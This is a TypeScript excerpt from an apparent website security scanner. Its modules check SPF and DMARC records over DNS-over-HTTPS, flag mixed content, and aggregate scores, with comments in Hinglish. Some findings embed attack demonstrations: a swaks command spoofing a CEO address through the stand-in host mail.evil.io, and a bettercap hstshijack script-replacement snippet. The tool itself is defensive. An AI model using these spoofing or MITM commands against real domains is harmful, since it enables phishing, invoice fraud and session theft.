// ---------- Module 10: DNS / Email Security (SPF + DMARC via DoH — passive recon) ----------
async function dohTxt(name: string): Promise<string[]> {
  const res = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(name)}&type=TXT`, {
    signal: AbortSignal.timeout(4500),
    headers: { Accept: "application/dns-json" },
    cache: "no-store",
  });
  if (!res.ok) throw new Error("DoH unavailable");
  const j = (await res.json()) as { Answer?: Array<{ data: string }> };
  return (j.Answer ?? []).map((a) => a.data.replace(/^"|"$/g, ""));
}

async function modDnsEmail(ctx: ReturnType<typeof normalizeTarget>, online: boolean): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online) return unreachable("dns", "DNS & Email Security", "mail");
  let spf: string | null = null;
  let dmarc: string | null = null;
  try {
    const [txt, dm] = await Promise.all([dohTxt(ctx.host), dohTxt(`_dmarc.${ctx.host}`)]);
    spf = txt.find((t) => t.toLowerCase().startsWith("v=spf1")) ?? null;
    dmarc = dm.find((t) => t.toLowerCase().startsWith("v=dmarc1")) ?? null;
  } catch {
    findings.push(f("DNS-over-HTTPS lookup failed", "INFO", "DoH endpoint unreachable — module skip.", "ATTACK: N/A — infrastructure limitation.", "DEFENCE: dig TXT yourdomain.com + _dmarc.yourdomain.com se manually verify karo."));
    return mk("dns", "DNS & Email Security", "mail", 100, findings, "DoH skipped");
  }
  if (!spf) {
    score -= 35;
    findings.push(f("SPF record missing", "MEDIUM", "DNS TXT me v=spf1 nahi mila — koi bhi server is domain se email bhej ke spoof kar sakta hai.",
      "ATTACK: Forged email CEO/victim@target.com se — BEC fraud, filters trust badha dete hain kyunki SPF record hi nahi.",
      "DEFENCE: SPF TXT record with -all hard fail.",
      `# verify karo:
dig TXT ${ctx.host} +short          ← v=spf1 missing
# spoof simulation (AUTHORIZED lab):
swaks --from ceo@${ctx.host} --to victim@gmail.com --server mail.evil.io --header 'Subject: Urgent Invoice'`,
      `# DNS TXT record:
${ctx.host}.  IN TXT "v=spf1 include:_spf.google.com -all"
# -all = hard fail — koi bhi unauthorized server reject hoga`));
  } else if (/\+(all)|(all)\s*$/i.test(spf) || /\?all/i.test(spf)) {
    score -= 25;
    findings.push(f("SPF too permissive (+all/?all)", "MEDIUM", `SPF: "${spf}" — soft/pass-all koi bhi sender allow karta hai.`, "ATTACK: ~all ya +all ke saath spoofed mail SPFPASS/softfail me ja sakta hai — BEC campaigns ke liye enough.", "DEFENCE: -all hard fail use karo, includes minimum rakho (10 DNS lookups limit)."));
  }
  if (!dmarc) {
    score -= 35;
    findings.push(f("DMARC policy missing", "MEDIUM", `_dmarc.${ctx.host} TXT me v=DMARC1 nahi mila — spoofing detection/rejection policy absent.`,
      "ATTACK: SPF/DKIM fail hone par bhi mailbox providers message inbox me daal sakte hain (no policy) — brand impersonation easy.",
      "DEFENCE: DMARC quarantine se start karo, phir reject.",
      `dig TXT _dmarc.${ctx.host} +short     ← empty = no policy
# spoofed mail spam-folder ki jagah INBOX me aa sakta hai`,
      `# DNS TXT record:
_dmarc.${ctx.host}. IN TXT "v=DMARC1; p=quarantine; rua=mailto:dmarc@${ctx.host}"
# reports dekh ke: p=quarantine → p=reject upgrade`));
  } else if (!/p=(reject|quarantine)/i.test(dmarc)) {
    score -= 15;
    findings.push(f("DMARC p=none (monitoring only)", "LOW", `DMARC: "${dmarc.slice(0, 80)}" — policy none, spoofed mail reject nahi hota.`, "ATTACK: Monitoring-only DMARC attack rokta nahi — phishing campaigns chalti rehti hain.", "DEFENCE: Reports analyze karke p=quarantine → p=reject pe upgrade karo; sp= subdomain policy bhi set karo."));
  }
  if (!spf && !dmarc) {
    score -= 15;
    findings.push(f("Domain fully spoofable (no SPF + no DMARC)", "HIGH", "Email authentication layers dono missing — complete brand impersonation possible.", "ATTACK: Full domain spoofing: attacker aapke domain se invoice fraud, employee-targeted credential phishing bina filter issue ke bhej sakta hai.", "DEFENCE: SPF + DKIM + DMARC trio deploy karo — M3AAWG best practice; subdomains pe bhi sp= policy."));
  }
  if (score === 100) findings.push(f("Email auth configured", "INFO", `SPF: ${spf!.slice(0, 60)} · DMARC policy active.`, "ATTACK: Direct domain spoofing blocked.", "DEFENCE: MTA-STS + TLS-RPT bhi add karo for transport security."));
  return mk("dns", "DNS & Email Security", "mail", score, findings, `SPF: ${spf ? "present" : "MISSING"} · DMARC: ${dmarc ? "present" : "MISSING"}`);
}

// ---------- Module 11: Mixed Content & Client Security ----------
async function modMixed(_ctx: ReturnType<typeof normalizeTarget>, online: boolean, shared: Shared | null): Promise<ScanModule> {
  const findings: ScanFinding[] = [];
  let score = 100;
  if (!online || !shared) return unreachable("mixed", "Mixed Content", "image");
  const body = shared.body;
  const active = [
    ...(body.match(/<script[^>]+src=["']http:\/\/[^"']+/gi) ?? []),
    ...(body.match(/<iframe[^>]+src=["']http:\/\/[^"']+/gi) ?? []),
    ...(body.match(/<link[^>]+href=["']http:\/\/[^"']+/gi) ?? []),
  ];
  const passive = body.match(/<(img|video|audio|source)[^>]+src=["']http:\/\/[^"']+/gi) ?? [];
  if (active.length > 0) {
    score -= 40;
    findings.push(
      f(`Active mixed content: ${active.length} HTTP subresource(s)`, "HIGH",
        `HTTPS page pe HTTP script/iframe/link resources — e.g. ${active[0].slice(0, 80)}`,
        "ATTACK: Same-network attacker HTTP script ko MITM karke replace karta hai — page ke same-origin context me arbitrary JS = full session/credential theft.",
        "DEFENCE: Sab resources https:// karo + CSP upgrade-insecure-requests bridge.",
        `# MITM script replace (bettercap hstshijack):
set http.proxy.script hstshijack.js
# <script src="http://cdn.target.com/app.js"> intercept → attacker ka JS
# same-origin me chalta hai → cookies/DOM access`,
        `# sab subresources https:// karo
# + CSP bridge:
add_header Content-Security-Policy "upgrade-insecure-requests" always;`)
    );
  }
  if (passive.length > 0) {
    score -= 20;
    findings.push(
      f(`Passive mixed content: ${passive.length} HTTP media resource(s)`, "MEDIUM",
        "HTTP images/media on HTTPS page — browser padlock warning deta hai.",
        "ATTACK: Logo/image replace karke visual phishing, user trust erosion; content injection se defacement-style scare.",
        "DEFENCE: Media bhi https pe host karo; hotlinked third-party images ko proxy/cache karo.")
    );
  }
  if (/srcdoc\s*=/i.test(body) && !/sandbox\s*=/i.test(body)) {
    score -= 15;
    findings.push(f("iframe srcdoc without sandbox", "MEDIUM", "srcdoc iframe bina sandbox attribute ke.", "ATTACK: srcdoc content same-origin context inherit karta hai — injected markup parent page ke DOM/cookies tak pahunch sakta hai.", "DEFENCE: iframe pe sandbox attribute + allow-listed tokens rakho; srcdoc content ko bhi escape karo."));
  }
  if (score === 100) findings.push(f("No mixed content", "INFO", "HTTPS page pe sab subresources secure hain.", "ATTACK: Client-side transport attacks blocked.", "DEFENCE: CSP upgrade-insecure-requests + block-all-mixed-content permanent laga do."));
  return mk("mixed", "Mixed Content", "image", score, findings, `${active.length} active / ${passive.length} passive HTTP resource(s)`);
}

export async function scanWebsite(
  target: string,
  online: boolean,
  onModule?: (m: ScanModule) => void
): Promise<{ modules: ScanModule[]; score: number; verdict: string; durationMs: number }> {
  const startedAt = Date.now();
  let ctx: ReturnType<typeof normalizeTarget>;
  try {
    ctx = normalizeTarget(target);
  } catch {
    throw new Error("Invalid URL format");
  }

  // ONE shared homepage fetch — TLS/Headers/Cookies/Info/CORS/Forms/Mixed sab reuse karte hain
  const shared = online ? await sharedHomepage(ctx) : null;

  const tasks: Array<Promise<ScanModule>> = [
    modTLS(ctx, online, shared),
    modHeaders(ctx, online, shared),
    modCookies(ctx, online, shared),
    modInfo(ctx, online, shared),
    modCORS(ctx, online, shared),
    modSensitive(ctx, online),
    modForms(ctx, online, shared),
    modXssReflect(ctx, online),
    modRedirect(ctx, online),
    modDnsEmail(ctx, online),
    modMixed(ctx, online, shared),
  ];

  const modules: ScanModule[] = [];
  await Promise.all(
    tasks.map(async (t) => {
      try {
        const m = await t;
        modules.push(m);
        onModule?.(m); // live streaming: module complete hote hi route event bhej deta hai
      } catch {
        const m = mk("error-" + Math.random().toString(36).slice(2, 6), "Module Error", "alert-triangle", 0, [], "module crashed — skipped");
        modules.push(m);
        onModule?.(m);
      }
    })
  );

  const score = Math.round(modules.reduce((s, m) => s + m.score, 0) / modules.length);
  const verdict = score >= 85 ? "FORTIFIED" : score >= 70 ? "RESILIENT" : score >= 50 ? "VULNERABLE" : "CRITICALLY EXPOSED";
  return { modules, score, verdict, durationMs: Date.now() - startedAt };
}
